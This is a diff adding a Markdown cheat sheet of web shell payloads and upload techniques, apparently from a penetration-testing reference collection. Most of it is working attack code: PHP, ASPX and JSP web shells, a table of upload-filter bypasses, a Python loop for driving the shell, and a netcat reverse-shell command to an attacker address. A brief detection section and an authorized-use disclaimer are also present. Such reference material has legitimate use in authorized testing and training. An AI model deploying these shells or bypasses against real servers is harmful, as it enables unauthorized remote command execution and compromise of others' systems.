@@ -1,0 +1,133 @@
+# Web Shells Cheat Sheet
+
+Reference for web shell payloads and upload techniques — distinct from [`netcat-reverse-shell-cheatsheet-professional.md`](../03-Exploitation-and-Post-Exploitation/netcat-reverse-shell-cheatsheet-professional.md), which covers direct reverse-shell one-liners. A web shell is what you drop **through a file upload or write vulnerability** to get command execution via HTTP requests — often the step before pivoting to a full interactive shell.
+
+> All techniques below are for use in **authorized environments only** — this cheat sheet assumes an authorized lab, exam, or engagement, and only against a file-upload/write vulnerability already confirmed in scope.
+
+---
+
+## 1. Minimal PHP Web Shells
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+```php
+<?php echo shell_exec($_REQUEST['cmd']); ?>
+```
+
+Usage once uploaded:
+```
+http://target/uploads/shell.php?cmd=id
+```
+
+**Slightly more usable version** (handles output formatting, works with POST to avoid appearing in access logs' query string):
+```php
+<?php
+if(isset($_POST['cmd'])){
+    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
+}
+?>
+<form method="post"><input type="text" name="cmd"><input type="submit"></form>
+```
+
+---
+
+## 2. ASPX Web Shell (IIS/.NET Targets)
+
+```aspx
+<%@ Page Language="C#" %>
+<%
+    System.Diagnostics.Process p = new System.Diagnostics.Process();
+    p.StartInfo.FileName = "cmd.exe";
+    p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
+    p.StartInfo.UseShellExecute = false;
+    p.StartInfo.RedirectStandardOutput = true;
+    p.Start();
+    Response.Write(p.StandardOutput.ReadToEnd());
+%>
+```
+
+Usage:
+```
+http://target/uploads/shell.aspx?cmd=whoami
+```
+
+---
+
+## 3. JSP Web Shell (Java/Tomcat Targets)
+
+```jsp
+<%@ page import="java.util.*,java.io.*"%>
+<%
+    String cmd = request.getParameter("cmd");
+    if (cmd != null) {
+        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
+        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        String line;
+        while ((line = br.readLine()) != null) { out.println(line); }
+    }
+%>
+```
+
+Usage:
+```
+http://target/uploads/shell.jsp?cmd=id
+```
+
+---
+
+## 4. Upload Restriction Bypass Techniques
+
+| Restriction encountered | Bypass technique |
+|---|---|
+| Extension blocklist (`.php` blocked) | Try alternate PHP-executed extensions: `.phtml`, `.php5`, `.php7`, `.pht` (depends on server config) |
+| Extension allowlist (only images) | Double extension: `shell.php.jpg` (works only if the server misconfigures handling — verify, don't assume) |
+| Content-Type checked | Spoof the `Content-Type` header in the upload request to `image/jpeg` while keeping the malicious file content |
+| Magic-byte/file-signature check | Prepend a valid image header (e.g., GIF89a) before the PHP payload: `GIF89a<?php system($_GET['cmd']); ?>` — some parsers only check the first bytes |
+| Upload directory not web-accessible | Check for path traversal in the upload/filename parameter, or look for a secondary LFI to include the uploaded file from outside the web root |
+| `.htaccess` blocks execution in upload dir | If `.htaccess` upload itself isn't blocked, upload a permissive `.htaccess` first (`AddType application/x-httpd-php .jpg`), then upload the payload with that extension |
+
+Always confirm the specific bypass actually works in a lab/authorized target before relying on it — server configurations vary widely and these are starting points, not guarantees.
+
+---
+
+## 5. Confirming and Interacting With a Web Shell
+
+```bash
+# Confirm execution first with a harmless command
+curl "http://target/uploads/shell.php?cmd=id"
+
+# Interact via curl for one-off commands
+curl "http://target/uploads/shell.php?cmd=whoami"
+
+# For repeated interaction, a short Python wrapper is faster than repeated curl calls:
+```
+
+```python
+import requests
+while True:
+    cmd = input("shell> ")
+    r = requests.get("http://target/uploads/shell.php", params={"cmd": cmd})
+    print(r.text)
+```
+
+---
+
+## 6. Pivoting From a Web Shell to a Full Interactive Shell
+
+A web shell is slow and non-interactive (no tab completion, no `Ctrl+C`, breaks on long-running commands). As soon as you have code execution, upgrade it:
+
+1. Use the web shell to trigger a proper reverse shell one-liner — see [`netcat-reverse-shell-cheatsheet-professional.md`](../03-Exploitation-and-Post-Exploitation/netcat-reverse-shell-cheatsheet-professional.md) for the payload itself.
+2. Example: `http://target/uploads/shell.php?cmd=nc -e /bin/sh <attacker-ip> 4444` (assuming `nc` supports `-e`, otherwise use the mkfifo variant or a Python one-liner from the same file).
+3. Catch the callback on a listener, then stabilize the shell per that same cheat sheet's stabilization section.
+
+---
+
+## 7. Detection Awareness (What This Looks Like Defensively)
+
+Web shells leave a fairly distinct footprint — a file dropped via an unexpected upload path, followed by HTTP requests with suspicious parameters (`cmd=`, `exec=`) and, if execution succeeds, a web server process (`php-fpm`, `w3wp.exe`, `tomcat`) spawning an unexpected child process (`cmd.exe`, `/bin/sh`). If you're documenting this for a report, note this parent/child relationship explicitly — it's exactly what a Blue Team would key on, and the [`attack-types-detection-cheatsheet-professional.md`](../../Blue-Team/01-SOC-and-SIEM-Analysis/attack-types-detection-cheatsheet-professional.md) file covers the detection side.
+
+---
+
+*Direct reverse-shell payloads and stabilization: [`netcat-reverse-shell-cheatsheet-professional.md`](../03-Exploitation-and-Post-Exploitation/netcat-reverse-shell-cheatsheet-professional.md). Upload-vulnerability discovery itself: [`web-enumeration-common-vulns-cheatsheet-professional.md`](web-enumeration-common-vulns-cheatsheet-professional.md) in this folder. Detection counterpart: [`attack-types-detection-cheatsheet-professional.md`](../../Blue-Team/01-SOC-and-SIEM-Analysis/attack-types-detection-cheatsheet-professional.md).*
